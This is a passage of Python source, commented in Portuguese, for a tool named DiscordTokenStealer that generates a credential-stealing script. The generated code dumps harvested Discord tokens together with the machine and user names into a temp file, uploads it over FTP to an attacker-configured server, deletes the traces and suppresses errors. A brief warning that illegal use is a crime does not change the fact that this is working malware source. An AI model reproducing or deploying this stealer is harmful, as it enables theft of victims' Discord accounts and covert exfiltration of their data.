            f.write("=" * 60 + "\\n")
            f.write("DISCORD TOKENS EXFILTRATION\\n")
            f.write("=" * 60 + "\\n\\n")
            f.write(f"Machine: {{computer_name}}\\n")
            f.write(f"User: {{os.getenv('USERNAME', 'Unknown')}}\\n")
            f.write(f"Date: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}\\n")
            f.write("=" * 60 + "\\n\\n")
            
            for i, token in enumerate(tokens, 1):
                f.write(f"TOKEN {{i}}: {{token}}\\n\\n")
        
        # Upload para FTP
        with open(temp_file, 'rb') as f:
            ftp.storbinary(f'STOR {{filename}}', f)
        
        # Limpar arquivo tempor√°rio
        os.remove(temp_file)
        ftp.quit()
        return True
        
    except Exception as e:
        return False

# Execu√ß√£o principal
if __name__ == "__main__":
    tokens = extract_discord_tokens()
    if tokens:
        upload_to_ftp(
            tokens, 
            "{ftp_host}", 
            "{ftp_user}", 
            "{ftp_pass}", 
            "{ftp_path}"
        )
"""
    
    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è USO ILEGAL √â CRIME! ‚ö†Ô∏è[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        stealer = DiscordTokenStealer()
        stealer.menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]‚úó Cancelado pelo usu√°rio[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]‚úó Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
